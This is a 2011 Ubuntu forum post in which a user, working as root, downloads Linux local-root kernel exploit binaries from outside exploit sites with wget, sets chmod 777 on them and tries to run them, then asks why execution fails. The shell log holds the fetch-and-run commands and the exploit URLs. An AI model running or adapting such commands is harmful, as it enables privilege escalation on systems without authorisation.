---
title: "Problem accessing files"
date: 2011-08-16
forum: New to Ubuntu
---

### Post by BinaryEnCoder on 2011-08-16
Hello everyone

I have a problem accessing files that i download with wget.
I was about to do some tests with kernel exploits but whenever I got the exploits via wget
after I chmod to 777
i get 
-bash: No such file or directory


root@tptest13:~# wget [http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/cw7.3](http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/cw7.3)
root@tptest13:~# unzip cw7.3.zip
root@tptest13:~# chmod 777 cw7.3
root@tptest13:~# ./cw7.3
-bash: ./cw7.3: No such file or directory
root@tptest13:~# wget [http://localroot.th3-0utl4ws.com/xploits/ptrace-kmod.zip](http://localroot.th3-0utl4ws.com/xploits/ptrace-kmod.zip)
--2011-08-16 11:43:22--  [http://localroot.th3-0utl4ws.com/xploits/ptrace-kmod.zip](http://localroot.th3-0utl4ws.com/xploits/ptrace-kmod.zip)
Resolving localroot.th3-0utl4ws.com... 46.29.252.239
Connecting to localroot.th3-0utl4ws.com|46.29.252.239|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3887 (3.8K) [application/zip]
Saving to: `ptrace-kmod.zip'

100%[======================================>] 3,887       --.-K/s   in 0s

2011-08-16 11:43:23 (163 MB/s) - `ptrace-kmod.zip' saved [3887/3887]

root@tptest13:~# unzip ptrace-kmod.zip
Archive:  ptrace-kmod.zip
  inflating: ptrace-kmod
root@tptest13:~# chmod 777 ptrace-kmod
root@tptest13:~# ./ptrace-kmod
-bash: ./ptrace-kmod: No such file or directory
root@tptest13:~# ls
cw7.3.zip  ptrace-kmod  ptrace-kmod.zip



how is this possible ? I've tried with 2 different files and still the same result.
Is there a build in antivirus that wont let me execute them ?

---

